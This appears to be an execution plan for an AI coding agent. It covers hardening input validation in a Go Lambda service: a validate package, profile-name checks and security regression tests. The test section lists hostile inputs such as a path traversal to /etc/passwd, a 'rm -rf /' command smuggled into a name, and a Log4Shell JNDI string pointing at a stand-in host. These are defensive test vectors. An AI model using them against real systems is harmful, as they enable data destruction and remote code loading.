---
phase: 134-input-sanitization
plan: 01
type: execute
wave: 1
depends_on: []
files_modified:
  - validate/validate.go
  - validate/validate_test.go
  - lambda/handler.go
  - lambda/handler_test.go
autonomous: true
---

<objective>
Create centralized input validation utilities and harden Lambda handler input validation.

Purpose: Prevent command injection, path traversal, and injection attacks through consistent input validation across all API boundaries.
Output: validate package with reusable validators, hardened Lambda handler with profile name validation.
</objective>

<execution_context>
@./.claude/get-shit-done/workflows/execute-plan.md
@./.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/133-rate-limit-hardening/133-02-SUMMARY.md

# Existing sanitization patterns:
@identity/types.go
@shell/shell.go
@device/identity.go
@lambda/handler.go
@lambda/mdm_integration.go
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create validate package with input validation utilities</name>
  <files>validate/validate.go, validate/validate_test.go</files>
  <action>
Create new `validate` package with reusable input validation functions:

1. `ValidateProfileName(name string) error` - validates SSM-style profile names:
   - Max 256 characters (SSM parameter path limit)
   - Only allows: alphanumeric, hyphen, underscore, forward slash
   - No path traversal sequences (../ or //)
   - No null bytes or control characters
   - Returns descriptive error or nil

2. `ValidateSafeString(s string, maxLen int) error` - general safe string validation:
   - No null bytes (\x00)
   - No control characters (ASCII 0-31 except \t\n\r)
   - Within maxLen
   - Returns descriptive error or nil

3. `SanitizeForLog(s string, maxLen int) string` - sanitizes strings for safe logging:
   - Replaces control characters with unicode escapes
   - Truncates to maxLen
   - Safe for JSON/structured logging

4. Constants for common limits:
   - MaxProfileNameLength = 256
   - MaxQueryParamLength = 1024

Use regexp for pattern matching. Follow existing patterns in identity/types.go.

Test coverage:
- Valid profile names (simple, with path, with hyphens/underscores)
- Invalid profile names (path traversal, null bytes, control chars, too long)
- Edge cases (empty string, single char, max length)
- Unicode handling (reject non-ASCII for security)
  </action>
  <verify>`go test ./validate/... -v` passes with all validation tests</verify>
  <done>validate package exists with ValidateProfileName, ValidateSafeString, SanitizeForLog functions and comprehensive tests</done>
</task>

<task type="auto">
  <name>Task 2: Add profile name validation to Lambda handler</name>
  <files>lambda/handler.go, lambda/handler_test.go</files>
  <action>
Add profile name validation in Lambda handler:

1. Import the new validate package

2. After extracting profile from query string, add validation:
```go
// Validate profile name format
if err := validate.ValidateProfileName(profile); err != nil {
    log.Printf("ERROR: Invalid profile name: %s - %v", validate.SanitizeForLog(profile, 50), err)
    return errorResponse(http.StatusBadRequest, "INVALID_PROFILE",
        "Invalid profile name format")
}
```

3. Place validation BEFORE any use of profile (before CreateSessionContext)

4. Use SanitizeForLog when logging the profile value to prevent log injection

5. Add tests in lambda/handler_test.go:
   - TestHandleRequest_InvalidProfileFormat (path traversal attempts)
   - TestHandleRequest_ProfileNameInjection (null bytes, control chars)
   - Verify error response is generic (doesn't echo back malicious input)
  </action>
  <verify>`go test ./lambda/... -v -run Profile` passes</verify>
  <done>Lambda handler validates profile name format before use, rejects invalid formats with 400 status, logs sanitized values only</done>
</task>

<task type="auto">
  <name>Task 3: Add input validation security tests</name>
  <files>validate/security_test.go</files>
  <action>
Create security regression tests in validate/security_test.go:

1. TestSecurityRegression_ProfileNameInjection - tests all injection vectors:
   - Path traversal: "../../../etc/passwd", "/sentinel/../secrets"
   - Null byte injection: "profile\x00admin"
   - Command injection: "profile;rm -rf /"
   - JNDI/Log4Shell: "${jndi:ldap://evil}"
   - Control characters: "profile\t\n\radmin"
   - Unicode exploits: Cyrillic homoglyphs

2. TestSecurityRegression_LogSanitization - ensures logs can't be manipulated:
   - Newline injection (log splitting)
   - JSON injection in structured logs
   - ANSI escape sequences

3. TestSecurityRegression_QueryParamOverflow - length limits:
   - Profile names at/above 256 char limit
   - Very long strings (1MB+) don't cause DoS

4. Document threat model in test comments with SECURITY VIOLATION prefix for failures

Follow patterns in identity/security_test.go
  </action>
  <verify>`go test ./validate/... -v -run SecurityRegression` passes</verify>
  <done>Security regression tests exist for all input validation scenarios, documenting threat model</done>
</task>

</tasks>

<verification>
Before declaring plan complete:
- [ ] `go test ./validate/... -v` passes
- [ ] `go test ./lambda/... -v` passes
- [ ] `go build ./...` succeeds
- [ ] `go vet ./...` passes
- [ ] Security regression tests document all injection vectors
</verification>

<success_criteria>
- All tasks completed
- All verification checks pass
- No errors or warnings introduced
- validate package provides reusable input validation
- Lambda handler validates all user input before use
- Security tests cover injection attack vectors
</success_criteria>

<output>
After completion, create `.planning/phases/134-input-sanitization/134-01-SUMMARY.md`
</output>
